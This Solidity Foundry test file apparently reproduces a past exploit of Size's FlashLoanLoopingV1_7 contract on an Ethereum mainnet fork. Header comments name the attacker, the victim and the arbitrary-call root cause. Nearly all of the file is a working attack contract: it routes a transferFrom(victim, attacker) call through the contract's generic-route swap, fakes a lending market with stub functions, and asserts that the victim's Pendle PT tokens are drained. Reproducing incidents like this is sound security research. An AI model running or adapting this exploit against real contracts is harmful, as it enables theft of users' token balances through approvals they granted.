// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 533.05 USD
// Attacker : 0x326dc2ff9045ae79ca3e395d584d3b56af1f310e
// Attack Contract : 0x977e8f1c4e3a05be213d62428afc2891aeb9f4e3
// Vulnerable Contract : 0x4b356dc596dd508836bd9e8fe5acad81f8cf9019
// Attack Tx : https://etherscan.io/tx/0x63aaa5a9fc87ce419c8b1711effee34e2c726b3ee2c2d28f64b963408d6ea8d3
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x4b356dc596dd508836bd9e8fe5acad81f8cf9019#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1669
//
// Attack summary: The attacker deployed initcode that created a temporary helper and called Size's
// FlashLoanLoopingV1_7.loopPositionWithFlashLoan() with SwapMethod.GenericRoute. The generic route target was a
// Pendle PT token, and the route calldata was transferFrom(victim, attacker, amount).
// Root cause: DexSwap._swapGenericRoute() accepts caller-controlled router and calldata, approves tokenIn to that
// router, then performs router.call(data). When used through the public flashloan loop entrypoint, this arbitrary
// external call let the Size periphery spend third-party token allowances granted to the vulnerable contract.

address constant ATTACKER = 0x326dc2FF9045AE79Ca3E395D584d3b56aF1F310e;
address constant ATTACK_CONTRACT = 0x977E8f1C4e3a05BE213D62428AFC2891Aeb9F4e3;
address constant VICTIM = 0xaC47Ea87b634E0CAbcA5c291EaD7C1474668210d;
address constant FLASH_LOAN_LOOPING = 0x4b356Dc596dd508836bd9e8FE5aCad81F8Cf9019;
address constant PENDLE_PT = 0x23E60d1488525bf4685f53b3aa8E676c30321066;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

uint256 constant PT_AMOUNT = 540_576_557_356_106_541_792;
uint256 constant WETH_DUST = 10_000;

interface IFlashLoanLoopingV17 {
    enum SwapMethod {
        OneInch,
        Unoswap,
        UniswapV2,
        UniswapV3,
        GenericRoute,
        BoringPtSeller,
        BuyPt
    }

    struct SellCreditMarketParams {
        address lender;
        uint256 creditPositionId;
        uint256 amount;
        uint256 tenor;
        uint256 deadline;
        uint256 maxAPR;
        bool exactAmountIn;
    }

    struct SwapParams {
        SwapMethod method;
        bytes data;
    }

    struct LoopParamsV17 {
        address sizeMarket;
        address collateralToken;
        address borrowToken;
        uint256 flashLoanAmountBorrowToken;
        SellCreditMarketParams[] sellCreditMarketParamsArray;
        SwapParams[] swapParamsArray;
        uint256 targetLeveragePercent;
    }

    function loopPositionWithFlashLoan(LoopParamsV17 calldata loopParams) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    SizeFlashLoanLoopingAttack private exploit;

    function setUp() public {
        uint256 forkBlock = 23_146_022;
        vm.createSelectFork("mainnet", forkBlock);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(VICTIM, "Victim");
        vm.label(FLASH_LOAN_LOOPING, "Size FlashLoanLoopingV1_7");
        vm.label(PENDLE_PT, "Pendle PT");
        vm.label(WETH_TOKEN, "WETH");

        exploit = new SizeFlashLoanLoopingAttack();
        vm.deal(address(exploit), WETH_DUST);
        fundingToken = PENDLE_PT;
        attacker = address(exploit);
    }

    function testExploit() public balanceLog {
        uint256 victimBefore = IERC20(PENDLE_PT).balanceOf(VICTIM);
        uint256 allowanceBefore = IERC20(PENDLE_PT).allowance(VICTIM, FLASH_LOAN_LOOPING);

        assertGe(victimBefore, PT_AMOUNT, "victim balance");
        assertGe(allowanceBefore, PT_AMOUNT, "victim allowance");

        exploit.run();

        assertEq(IERC20(PENDLE_PT).balanceOf(address(exploit)), PT_AMOUNT, "PT profit");
        assertEq(victimBefore - IERC20(PENDLE_PT).balanceOf(VICTIM), PT_AMOUNT, "victim loss");
    }
}

contract SizeFlashLoanLoopingAttack {
    struct DepositParams {
        address token;
        uint256 amount;
        address to;
    }

    struct GenericRouteParams {
        address router;
        address tokenIn;
        bytes data;
    }

    receive() external payable {}

    function run() external {
        IWETH(payable(WETH_TOKEN)).deposit{value: WETH_DUST}();

        GenericRouteParams memory route = GenericRouteParams({
            router: PENDLE_PT,
            tokenIn: WETH_TOKEN,
            data: abi.encodeWithSelector(IERC20.transferFrom.selector, VICTIM, address(this), PT_AMOUNT)
        });

        IFlashLoanLoopingV17.SwapParams[] memory swaps = new IFlashLoanLoopingV17.SwapParams[](1);
        swaps[0] = IFlashLoanLoopingV17.SwapParams({
            method: IFlashLoanLoopingV17.SwapMethod.GenericRoute,
            data: abi.encode(route)
        });

        IFlashLoanLoopingV17.SellCreditMarketParams[] memory emptySellCreditParams =
            new IFlashLoanLoopingV17.SellCreditMarketParams[](0);

        IFlashLoanLoopingV17.LoopParamsV17 memory loopParams = IFlashLoanLoopingV17.LoopParamsV17({
            sizeMarket: address(this),
            collateralToken: address(this),
            borrowToken: WETH_TOKEN,
            flashLoanAmountBorrowToken: 0,
            sellCreditMarketParamsArray: emptySellCreditParams,
            swapParamsArray: swaps,
            targetLeveragePercent: 10_000
        });

        IFlashLoanLoopingV17(FLASH_LOAN_LOOPING).loopPositionWithFlashLoan(loopParams);
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 10_000_000_000_000_000_000_000_000_000_000;
    }

    function multicall(bytes[] calldata calls) external pure returns (bytes[] memory results) {
        results = new bytes[](calls.length);
    }

    function data()
        external
        pure
        returns (
            uint256 nextDebtPositionId,
            uint256 nextCreditPositionId,
            address underlyingCollateralToken,
            address underlyingBorrowToken,
            address collateralToken,
            address borrowAToken,
            address debtToken,
            address variablePool
        )
    {
        nextDebtPositionId = 0;
        nextCreditPositionId = 0;
        underlyingCollateralToken = WETH_TOKEN;
        underlyingBorrowToken = WETH_TOKEN;
        collateralToken = WETH_TOKEN;
        borrowAToken = WETH_TOKEN;
        debtToken = WETH_TOKEN;
        variablePool = WETH_TOKEN;
    }

    function debtTokenAmountToCollateralTokenAmount(uint256) external pure returns (uint256) {
        return 10;
    }

    function deposit(DepositParams calldata) external payable {}
}
